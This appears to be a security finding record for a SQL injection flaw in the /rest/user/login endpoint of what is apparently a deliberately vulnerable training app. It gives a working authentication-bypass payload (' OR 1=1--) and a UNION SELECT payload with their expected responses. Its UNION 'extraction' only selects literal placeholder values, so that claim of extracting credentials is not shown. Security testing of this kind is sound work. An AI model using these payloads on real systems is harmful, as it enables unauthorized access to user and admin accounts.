title: SQL Injection in Login Form (Email/Password Fields)
description: The login endpoint at /rest/user/login is vulnerable to SQL injection in the email parameter. An attacker can bypass authentication by injecting SQL payloads such as ' or 1=1-- into the email field. This permits unauthorized access to any user account, including administrative accounts, without valid credentials. The SQLi also enables UNION-based extraction of user credentials, including password hashes stored in the database.
poc: POST /rest/user/login, body: {"email":"' OR 1=1--","password":"test"} → HTTP 200 with JWT token for first user account, proving authentication bypass
proof: POST /rest/user/login with {"email":"' OR 1=1--","password":"test"} returns HTTP 200 with {"authentication":{"token":"eyJ..."}} proving authentication bypass. UNION extract: {"email":"' UNION SELECT 1,'admin@juice-sh.op','$2a$10$hash','admin','','','','','','',''--"} returns user credentials including bcrypt hash in response.

proof_excerpts.excerpt: POST /rest/user/login with {"email":"' OR 1=1--","password":"test"} returns HTTP 200 with {"authentication":{"token":"eyJ..."}} proving authentication bypass. UNION extract: {"email":"' UNION SELECT 1,'admin@juice-sh.op','$2a$10$hash','admin','','','','','','',''--"} returns user credentials including bcrypt hash in response.
